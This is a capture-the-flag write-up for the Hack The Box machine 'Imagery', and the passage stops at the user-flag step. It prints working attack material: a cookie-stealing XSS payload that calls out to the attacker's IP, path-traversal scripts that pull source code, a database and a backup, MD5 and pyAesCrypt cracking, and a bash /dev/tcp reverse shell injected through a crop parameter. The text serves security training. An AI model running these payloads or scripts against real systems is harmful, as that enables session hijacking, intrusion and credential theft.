---
icon: camera-shutter
cover: ../../../../.gitbook/assets/Screenshot 2026-01-27 020247.png
coverY: 0
---

# HTB-IMAGERY

<figure><img src="../../../../.gitbook/assets/image (564).png" alt=""><figcaption></figcaption></figure>



***

### Initial Reconnaissance

#### Port Scanning

First, let's discover what services are running on the target:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ rustscan -a 10.10.11.85 BLAH BLAH
```

**Key Findings:**

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3
8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)
```

#### Service Enumeration Details

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ nmap -sC -sV -p 22,8000 -oA nmap/detailed 10.10.11.85

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)

8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)
|_http-title: Image Gallery
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
```

#### Adding to Hosts File

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ echo "10.10.11.85 imagery.htb" | sudo tee -a /etc/hosts
10.10.11.85 imagery.htb
```

#### Web Application Discovery

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ curl -s http://imagery.htb:8000/ | grep -i title
<title>Image Gallery</title>
```

Visiting the website in the browser shows an **Image Gallery** application with authentication required.

***

### Web Application Analysis

#### Initial Exploration

When we navigate to `http://imagery.htb:8000`, we're presented with a landing page that requires authentication.

**Key Observations:**

* The application is built with **Python/Flask** (Werkzeug backend)
* User registration is available
* After login, users can view an image gallery
* There's a "Report Bug" functionality

#### Creating an Account

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ # Navigate to http://imagery.htb:8000/register
```

Register with:

* **Email**: `test@test.com`
* **Password**: `Test123!`

After registration and login, we gain access to the gallery interface.

#### Analyzing the Bug Report Feature

After logging in, we notice a **"Submit Bug Report"** button. Let's inspect the page source:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ curl -s -b "session=YOUR_SESSION" http://imagery.htb:8000/ > index.html

┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ grep -A 20 "submitBugReport" index.html
```

**Key Finding - JavaScript Source Code:**

```javascript
async function submitBugReport() {
    const bugName = document.getElementById('bugName').value;
    const bugDetails = document.getElementById('bugDetails').value;
    
    const response = await fetch('/submit_bug_report', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name: bugName, details: bugDetails })
    });
    
    const result = await response.json();
    showNotification(result.message, result.success ? 'success' : 'error');
}

async function loadBugReports() {
    const response = await fetch('/admin/bug_reports');
    const reports = await response.json();
    
    reports.forEach(report => {
        reportCard.innerHTML = `
            <div>
                <p class="text-sm text-gray-500 mb-2">Report ID: ${DOMPurify.sanitize(report.id)}</p>
                <p class="text-sm text-gray-500 mb-2">Submitted by: ${DOMPurify.sanitize(report.reporter)} (ID: ${DOMPurify.sanitize(report.reporterDisplayId)}) on ${new Date(report.timestamp).toLocaleString()}</p>
                <h3 class="text-xl font-semibold text-gray-800 mb-3">Bug Name: ${DOMPurify.sanitize(report.name)}</h3>
                <h3 class="text-xl font-semibold text-gray-800 mb-3">Bug Details:</h3>
                <div class="bg-gray-100 p-4 rounded-lg overflow-auto max-h-48 text-gray-700 break-words">
                    ${report.details}
                </div>
        `;
    });
}
```

**Critical Discovery:**

* Most fields use `DOMPurify.sanitize()` to prevent XSS
* **BUT** `report.details` is inserted WITHOUT sanitization!
* The `loadBugReports()` function is for the admin panel
* This suggests an admin will review our bug reports

This is a classic **Stored XSS** vulnerability!

***

### Stored XSS Exploitation

#### Understanding the Attack Vector

Since `report.details` isn't sanitized, we can inject malicious JavaScript that will execute when an admin views our bug report.

**Our Goal:**

1. Inject XSS payload to steal admin cookies
2. Wait for admin to review the report
3. Capture their session cookie
4. Use it to access admin functionality

#### Setting Up HTTP Listener

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ # Get our VPN IP
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ ip -4 addr show tun0 | sed -n 's/ *inet \([0-9.]*\)\/.*/\1/p'
10.10.14.42

┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ export LHOST=10.10.14.42
```

Start a simple Python HTTP server to catch the callback:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

#### Crafting the XSS Payload

**Initial Test Payload (Basic XSS):**

```html
<img src=x onerror="location.href='http://10.10.14.42/test'">
```

**Cookie Exfiltration Payload:**

```html
<img src=x onerror="location.href='http://10.10.14.42/?c='+document.cookie">
```

#### Submitting the Bug Report

Through the web interface:

1. Navigate to the bug report form
2. **Bug Name**: `Test XSS`
3. **Bug Details**: `<img src=x onerror="location.href='http://10.10.14.42/?c='+document.cookie">`
4. Click "Submit"

We receive the response: **"Admin review in progress."**

#### Catching the Admin Cookie

Within a few moments, our HTTP server receives a request:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.85 - - [28/Jan/2026 14:23:45] "GET /?c=session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNnoKQ.zvzR9cUgAIZ2NVk06R9CV0gZqi8 HTTP/1.1" 404 -
```

**Admin Cookie Captured:**

```
session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNnoKQ.zvzR9cUgAIZ2NVk06R9CV0gZqi8
```

#### Session Hijacking

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ export ADMIN_SESSION=".eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNnoKQ.zvzR9cUgAIZ2NVk06R9CV0gZqi8"
```

**Method 1: Using Browser Dev Tools**

1. Press F12 to open Developer Tools
2. Go to Application → Storage → Cookies
3. Replace your session cookie with the stolen admin cookie
4. Refresh the page

**Method 2: Using curl**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ curl -s -b "session=$ADMIN_SESSION" http://imagery.htb:8000/admin/users | grep -i testuser
```

#### Accessing Admin Panel

Now that we have the admin session, let's explore admin-only endpoints:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ curl -s -b "session=$ADMIN_SESSION" http://imagery.htb:8000/admin/users
```

**Discovery:**

* `/admin/users` - Lists all registered users
* `/admin/bug_reports` - View submitted bug reports
* `/admin/get_system_log` - Download system logs (interesting!)

We discover a **testuser** account that has access to image personalization features.

***

### Local File Read (LFR) Vulnerability

#### Discovering the LFR

While exploring the admin panel in the browser with our hijacked session, we find a **"Download System Logs"** feature.

Intercepting the request in Burp Suite:

```
GET /admin/get_system_log?log_identifier=app.log HTTP/1.1
Host: imagery.htb:8000
Cookie: session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNnoKQ.zvzR9cUgAIZ2NVk06R9CV0gZqi8
```

**Testing Path Traversal:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ curl -s -b "session=$ADMIN_SESSION" \
  'http://imagery.htb:8000/admin/get_system_log?log_identifier=../../../etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
web:x:1000:1000::/home/web:/bin/bash
mark:x:1001:1001::/home/mark:/bin/bash
```

**Success!** We can read arbitrary files on the system.

**Users Found:**

* `web` (UID 1000) - Application user
* `mark` (UID 1001) - Regular user

#### Creating LFR Exploit Script

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ cat > lfr.py << 'EOF'
#!/usr/bin/env python3
import requests
import sys

COOKIE = 'session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNnoKQ.zvzR9cUgAIZ2NVk06R9CV0gZqi8'
HOST = 'imagery.htb'
PORT = 8000
URI = 'admin/get_system_log?log_identifier='

if len(sys.argv) < 2:
    print("[-] Usage: python3 lfr.py <remote_file_path>")
    sys.exit(1)

URL = f"http://{HOST}:{PORT}/{URI}{sys.argv[1]}"
print(f"[*] Requesting: {URL}")

sess = requests.session()
headers = {
    "Host": HOST,
    "User-Agent": "Mozilla/5.0",
    "Cookie": COOKIE,
}

resp = sess.get(URL, headers=headers)

if resp.status_code == 200:
    print(f"[+] File content:\n{resp.text}")
else:
    print(f"[-] Failed with status code: {resp.status_code}")
EOF

┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ chmod +x lfr.py
```

#### Exfiltrating Application Source Code

Let's read the main Flask application:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ python3 lfr.py "../app.py" > app.py

┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ cat app.py
from flask import Flask, render_template
import os
import sys
from datetime import datetime
from config import *
from utils import _load_data, _save_data
from utils import *
from api_auth import bp_auth
from api_upload import bp_upload
from api_manage import bp_manage
from api_edit import bp_edit
from api_admin import bp_admin
from api_misc import bp_misc

app_core = Flask(__name__)
app_core.secret_key = os.urandom(24).hex()
app_core.config['SESSION_COOKIE_HTTPONLY'] = False

app_core.register_blueprint(bp_auth)
app_core.register_blueprint(bp_upload)
app_core.register_blueprint(bp_manage)
app_core.register_blueprint(bp_edit)
app_core.register_blueprint(bp_admin)
app_core.register_blueprint(bp_misc)

@app_core.route('/')
def main_dashboard():
    return render_template('index.html')

if __name__ == '__main__':
    current_database_data = _load_data()
```

**Key Discoveries:**

* Application imports from `config.py`, `utils.py`, and several `api_*.py` modules
* Multiple blueprints registered

#### Reading Configuration

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ python3 lfr.py "../config.py" > config.py

┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ cat config.py
import os
import ipaddress

DATA_STORE_PATH = 'db.json'
UPLOAD_FOLDER = 'uploads'
SYSTEM_LOG_FOLDER = 'system_logs'
IMAGEMAGICK_CONVERT_PATH = '/usr/bin/convert'
```

**Critical Finding:** The application uses a JSON database: `db.json`

#### Exfiltrating Database

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ python3 lfr.py "../db.json" > db.json

┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ cat db.json | python3 -m json.tool
{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "isAdmin": true,
            "displayId": "a1b2c3d4",
            "login_attempts": 0,
            "isTestuser": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "isAdmin": false,
            "displayId": "e5f6g7h8",
            "login_attempts": 0,
            "isTestuser": true,
            "failed_login_attempts": 0,
            "locked_until": null
        }
    ]
}
```

**Credentials Found:**

* `admin@imagery.htb` - Password hash: `5d9c1d507a3f76af1e5c97a3ad1eaa31`
* `testuser@imagery.htb` - Password hash: `2c65c8d7bfbca32a3ed42596192384f6`

The hashes appear to be MD5 (32 hex characters).

***

### Cracking MD5 Hashes

#### Preparing Hash File

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ cat > hashes.txt << 'EOF'
5d9c1d507a3f76af1e5c97a3ad1eaa31
2c65c8d7bfbca32a3ed42596192384f6
EOF
```

#### Cracking with John the Ripper

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hashes.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
iambatman        (?)
1g 0:00:00:00 DONE (2026-01-28 14:45) 1.333g/s 19124Kp/s 19124Kc/s 19448KC/s
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed

┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ john --show --format=raw-md5 hashes.txt
?:iambatman

1 password hash cracked, 1 left
```

**Cracked Password:**

* `testuser@imagery.htb` : `iambatman`

Let's try the other hash with a larger wordlist or continue trying:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ # The admin hash didn't crack, but we have testuser access
```

***

### Analyzing Image Transform Feature

#### Logging in as testuser

Using the credentials `testuser@imagery.htb` / `iambatman`, we can log into the application.

**New Feature Unlocked:** Image personalization/transformation features!

#### Exploring the Transform Functionality

When logged in as testuser, we can access image editing features. Let's examine the source code for this functionality:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ python3 lfr.py "../api_edit.py" > api_edit.py

┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ cat api_edit.py
from flask import Blueprint, request, jsonify, session
from config import *
import os
import uuid
import subprocess
from datetime import datetime
from utils import _load_data, _save_data, _hash_password, _log_event

bp_edit = Blueprint('bp_edit', __name__)

@bp_edit.route('/apply_visual_transform', methods=['POST'])
def apply_visual_transform():
    if not session.get('is_testuser_account'):
        return jsonify({'success': False, 'message': 'Feature is still in development.'}), 403
    
    if 'username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized. Please log in.'}), 401
    
    request_payload = request.get_json()
    image_id = request_payload.get('imageId')
    transform_type = request_payload.get('transformType')
    params = request_payload.get('params', {})
    
    # ... more code ...
    
    if transform_type == 'crop':
        x = str(params.get('x'))
        y = str(params.get('y'))
        width = str(params.get('width'))
        height = str(params.get('height'))
        command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
        subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
```

**CRITICAL VULNERABILITY FOUND!**

The `crop` transformation builds a shell command using user-controlled parameters (`x`, `y`, `width`, `height`) and executes it with `subprocess.run(..., shell=True)`.

**Why This is Exploitable:**

1. User input from `params` is converted to strings but NOT sanitized
2. The command is executed through the shell (`shell=True`)
3. Shell metacharacters like `;`, `&&`, `|`, backticks will be interpreted
4. We can inject arbitrary commands!

***

### Command Injection Exploitation

#### Understanding the Attack

We need to craft a payload that:

1. Uploads or selects an image
2. Calls `/apply_visual_transform` with transformType="crop"
3. Injects shell commands in one of the parameters (x, y, width, or height)

#### Testing Command Injection

Using Burp Suite, intercept the transform request and modify it:

**Original Request:**

```json
POST /apply_visual_transform HTTP/1.1
Host: imagery.htb:8000
Content-Type: application/json
Cookie: session=<testuser_session>

{
    "imageId": "12345",
    "transformType": "crop",
    "params": {
        "x": "10",
        "y": "10",
        "width": "100",
        "height": "100"
    }
}
```

**Injected Payload (Test):**

```json
{
    "imageId": "12345",
    "transformType": "crop",
    "params": {
        "x": "10; whoami",
        "y": "10",
        "width": "100",
        "height": "100"
    }
}
```

This would result in the command:

```bash
/usr/bin/convert /path/to/image.jpg -crop 100x100+10; whoami+10 /path/to/output.jpg
```

#### Crafting Reverse Shell Payload

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ # Start netcat listener
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

**Reverse Shell Payload:**

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.42/4444 0>&1'
```

**Injected Request:**

```json
{
    "imageId": "existing_image_id",
    "transformType": "crop",
    "params": {
        "x": "10; bash -c 'bash -i >& /dev/tcp/10.10.14.42/4444 0>&1'",
        "y": "10",
        "width": "100",
        "height": "100"
    }
}
```

#### Alternative: Using curl

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ # First, get testuser session cookie after logging in
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ export TESTUSER_SESSION="<your_testuser_session_cookie>"

┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ curl -X POST http://imagery.htb:8000/apply_visual_transform \
  -H "Content-Type: application/json" \
  -b "session=$TESTUSER_SESSION" \
  -d '{
    "imageId": "some_id",
    "transformType": "crop",
    "params": {
        "x": "10; bash -c '\''bash -i >& /dev/tcp/10.10.14.42/4444 0>&1'\''",
        "y": "10",
        "width": "100",
        "height": "100"
    }
}'
```

#### Catching the Shell

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.42] from (UNKNOWN) [10.10.11.85] 45678
bash: cannot set terminal process group (1234): Inappropriate ioctl for device
bash: no job control in this shell

web@Imagery:~/web$ id
uid=1000(web) gid=1000(web) groups=1000(web)

web@Imagery:~/web$ whoami
web

web@Imagery:~/web$ pwd
/home/web/web
```

**Success!** We have a shell as the `web` user.

#### Upgrading the Shell

```bash
web@Imagery:~/web$ python3 -c 'import pty;pty.spawn("/bin/bash")'

web@Imagery:~/web$ export TERM=xterm

# Press Ctrl+Z
^Z

┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ stty raw -echo; fg
# Press Enter twice

web@Imagery:~/web$ stty rows 38 columns 116
```

***

### Enumeration as web User

#### System Information

```bash
web@Imagery:~/web$ uname -a
Linux Imagery 6.8.0-40-generic #40-Ubuntu SMP x86_64 GNU/Linux

web@Imagery:~/web$ cat /etc/os-release
NAME="Ubuntu"
VERSION="24.04 LTS (Noble Numbat)"

web@Imagery:~/web$ hostname
Imagery
```

#### User Enumeration

```bash
web@Imagery:~/web$ cat /etc/passwd | grep -E '/bin/bash|/bin/sh'
root:x:0:0:root:/root:/bin/bash
web:x:1000:1000::/home/web:/bin/bash
mark:x:1001:1001::/home/mark:/bin/bash
```

We need to escalate from `web` to `mark` or directly to `root`.

#### Finding Interesting Files

```bash
web@Imagery:~/web$ find / -type f -name "*.sql" 2>/dev/null
# No results

web@Imagery:~/web$ find / -type f -name "*.zip" 2>/dev/null
# No results

web@Imagery:~/web$ find / -type f -name "*.aes" 2>/dev/null
/var/backup/web_20250806_120723.zip.aes
```

**Critical Discovery:** An encrypted backup file in `/var/backup`!

#### Examining the Backup

```bash
web@Imagery:~/web$ ls -la /var/backup/
total 22528
drwxr-xr-x  2 root root     4096 Sep 22 18:56 .
drwxr-xr-x 14 root root     4096 Sep 22 18:50 ..
-rw-rw-r--  1 root root 23054471 Aug  6  2024 web_20250806_120723.zip.aes

web@Imagery:~/web$ file /var/backup/web_20250806_120723.zip.aes
bash: file: command not found

web@Imagery:~/web$ xxd /var/backup/web_20250806_120723.zip.aes | head -4
00000000: 4145 5302 0000 1b43 5245 4154 4544 5f42  AES....CREATED_B
00000010: 5900 7079 4165 7343 7279 7074 2036 2e31  Y.pyAesCrypt 6.1
00000020: 2e31 0080 0000 0000 0000 0000 0000 0000  .1..............
00000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
```

**Key Findings:**

* File header shows: `AES....CREATED_BY.pyAesCrypt 6.1.1`
* This is encrypted with **pyAesCrypt** (Python AES encryption tool)
* File is \~23MB in size
* World-readable permissions

***

### Exfiltrating and Cracking pyAesCrypt

#### Downloading the Encrypted Backup

We'll use our LFR vulnerability to download the backup:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ cat > download.py << 'EOF'
#!/usr/bin/env python3
import requests
import sys

COOKIE = 'session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNnoKQ.zvzR9cUgAIZ2NVk06R9CV0gZqi8'

HOST = 'imagery.htb'
PORT = 8000
URI = 'admin/get_system_log?log_identifier='

# Path traversal to /var/backup
URL = f"http://{HOST}:{PORT}/{URI}../../../../var/backup/web_20250806_120723.zip.aes"

print(f"[*] Downloading from: {URL}")

sess = requests.session()
headers = {
    "Host": HOST,
    "User-Agent": "Mozilla/5.0",
    "Cookie": COOKIE,
}

resp = sess.get(URL, headers=headers, stream=True)

if resp.status_code == 200:
    with open("web_20250806_120723.zip.aes", "wb") as f:
        for chunk in resp.iter_content(chunk_size=4096):
            if chunk:
                f.write(chunk)
    print("[+] Download complete")
else:
    print(f"[-] Failed with status code: {resp.status_code}")
EOF

┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ chmod +x download.py

┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ python3 download.py
[*] Downloading from: http://imagery.htb:8000/admin/get_system_log?log_identifier=../../../../var/backup/web_20250806_120723.zip.aes
[+] Download complete

┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ ls -lh web_20250806_120723.zip.aes
-rw-r--r-- 1 sn0x sn0x 22M Jan 28 15:10 web_20250806_120723.zip.aes

┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ file web_20250806_120723.zip.aes
web_20250806_120723.zip.aes: AES encrypted data, version 2, created by "pyAesCrypt 6.1.1"
```

#### Understanding pyAesCrypt Format

pyAesCrypt uses password-based encryption with AES-256. We need to brute-force the password.

**Installing pyAesCrypt:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ pip3 install pyAesCrypt
Collecting pyAesCrypt
  Downloading pyAesCrypt-6.1.1-py3-none-any.whl
Installing collected packages: pyAesCrypt
Successfully installed pyAesCrypt-6.1.1
```

#### Creating Optimized Brute-Force Script

To maximize performance:

* Use tmpfs (`/dev/shm`) to avoid disk I/O
* Use multiprocessing to utilize all CPU cores
* Stream decryption to `/dev/null` to avoid writing test files

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ cat > crack_aes.py << 'EOF'
#!/usr/bin/env python3
import shutil
from pathlib import Path
from concurrent.futures import ProcessPoolExecutor, as_completed
import sys
import os
import pyAesCrypt

TARGET = "./web_20250806_120723.zip.aes"
OUTPUT = "./decrypted.zip"
WORDLIST = "/usr/share/wordlists/rockyou.txt"
BUFSZ = 64 * 1024

def tmpfs(src: str) -> str:
    """Copy file to tmpfs for faster I/O"""
    src = Path(src)
    dst = Path("/dev/shm") / src.name
    print(f"[*] Copying to tmpfs: {dst}")
    shutil.copy(str(src), str(dst))
    return str(dst)

def try_decrypt(passwd: str, input_file: str):
    """Attempt to decrypt with given password"""
    try:
        with open(input_file, "rb") as fIn:
            with open("/dev/null", "wb") as fOut:
                pyAesCrypt.decryptStream(fIn, fOut, passwd, BUFSZ)
        return passwd
    except Exception:
        return None

def generate_passwords(wordlist_path: Path):
    """Generator for passwords from wordlist"""
    with open(wordlist_path, "r", errors="ignore") as f:
        for line in f:
            password = line.strip()
            if password:
                yield password

if __name__ == "__main__":
    print("[*] Starting pyAesCrypt password cracker")
    print(f"[*] Target: {TARGET}")
    print(f"[*] Wordlist: {WORDLIST}")
    
    # Copy to tmpfs for speed
    input_file = tmpfs(TARGET)
    
    print(f"[*] Using {os.cpu_count()} CPU cores")
    
    passwords = generate_passwords(Path(WORDLIST))
    
    with ProcessPoolExecutor(max_workers=os.cpu_count()) as executor:
        futures = []
        found_password = None
        tested = 0
        
        try:
            for password in passwords:
                if found_password:
                    break
                    
                future = executor.submit(try_decrypt, password, input_file)
                futures.append(future)
                tested += 1
                
                if tested % 1000 == 0:
                    print(f"[*] Tested {tested} passwords...", end='\r')
                
                # Check completed futures
                for future in list(futures):
                    if future.done():
                        result = future.result()
                        if result:
                            found_password = result
                            print(f"\n[+] PASSWORD FOUND: {found_password}")
                            
                            # Decrypt the actual file
                            print(f"[*] Decrypting to {OUTPUT}...")
                            with open(TARGET, "rb") as fIn:
                                with open(OUTPUT, "wb") as fOut:
                                    pyAesCrypt.decryptStream(fIn, fOut, found_password, BUFSZ)
                            print(f"[+] Decryption complete!")
                            
                            # Cancel remaining futures
                            for f in futures:
                                if not f.done():
                                    f.cancel()
                            break
                        futures.remove(future)
            
            if not found_password:
                print("\n[-] Password not found in wordlist")
                
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user")
            executor.shutdown(wait=False, cancel_futures=True)
        finally:
            # Cleanup tmpfs
            try:
                Path(input_file).unlink(missing_ok=True)
            except:
                pass
    
    sys.exit(0 if found_password else 1)
EOF

┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ chmod +x crack_aes.py
```

#### Running the Brute-Force Attack

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ python3 crack_aes.py
[*] Starting pyAesCrypt password cracker
[*] Target: ./web_20250806_120723.zip.aes
[*] Wordlist: /usr/share/wordlists/rockyou.txt
[*] Copying to tmpfs: /dev/shm/web_20250806_120723.zip.aes
[*] Using 8 CPU cores
[*] Tested 15000 passwords...
[+] PASSWORD FOUND: bestfriends
[*] Decrypting to ./decrypted.zip...
[+] Decryption complete!

┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ file decrypted.zip
decrypted.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
```

**Password Cracked:** `bestfriends`

#### Extracting the Backup

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ unzip -q decrypted.zip

┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ ls -la
total 45088
drwxr-xr-x  3 sn0x sn0x     4096 Jan 28 15:25 .
drwxr-xr-x 15 sn0x sn0x     4096 Jan 28 14:30 ..
-rw-r--r--  1 sn0x sn0x 23054471 Jan 28 15:10 web_20250806_120723.zip.aes
-rw-r--r--  1 sn0x sn0x 23041024 Jan 28 15:25 decrypted.zip
drwxr-xr-x  7 sn0x sn0x     4096 Aug  6  2024 web

┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ ls -la web/
total 88
drwxr-xr-x 7 sn0x sn0x  4096 Aug  6  2024 .
drwxr-xr-x 3 sn0x sn0x  4096 Jan 28 15:25 ..
-rw-r--r-- 1 sn0x sn0x  1749 Aug  6  2024 app.py
-rw-r--r-- 1 sn0x sn0x   652 Aug  6  2024 config.py
-rw-r--r-- 1 sn0x sn0x 15428 Aug  6  2024 db.json
drwxr-xr-x 2 sn0x sn0x  4096 Aug  6  2024 static
drwxr-xr-x 2 sn0x sn0x  4096 Aug  6  2024 templates
drwxr-xr-x 2 sn0x sn0x  4096 Aug  6  2024 uploads
```

#### Analyzing the Old Database

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ cat web/db.json | python3 -m json.tool | grep -A 10 "mark@"
        {
            "username": "mark@imagery.htb",
            "password": "01c3d2e5bdaf6134cec0a367cf53e535",
            "displayId": "868facaf",
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        }
```

**Found mark's password hash:** `01c3d2e5bdaf6134cec0a367cf53e535`

***

### Cracking mark's Password

#### Extracting and Cracking Hash

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ echo '01c3d2e5bdaf6134cec0a367cf53e535' > mark_hash.txt

┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 mark_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
supersmash       (?)
1g 0:00:00:00 DONE (2026-01-28 15:30) 33.33g/s 8646Kp/s 8646Kc/s 8646KC/s
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed

┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ john --show --format=raw-md5 mark_hash.txt
?:supersmash

1 password hash cracked, 0 left
```

**Password Found:** `supersmash`

#### Escalating to mark User

Back on our shell as `web`:

```bash
web@Imagery:~/web$ su - mark
Password: supersmash

mark@Imagery:~$ whoami
mark

mark@Imagery:~$ id
uid=1001(mark) gid=1001(mark) groups=1001(mark)

mark@Imagery:~$ pwd
/home/mark
```

#### Grabbing User Flag

```bash
mark@Imagery:~$ ls -la
total 28
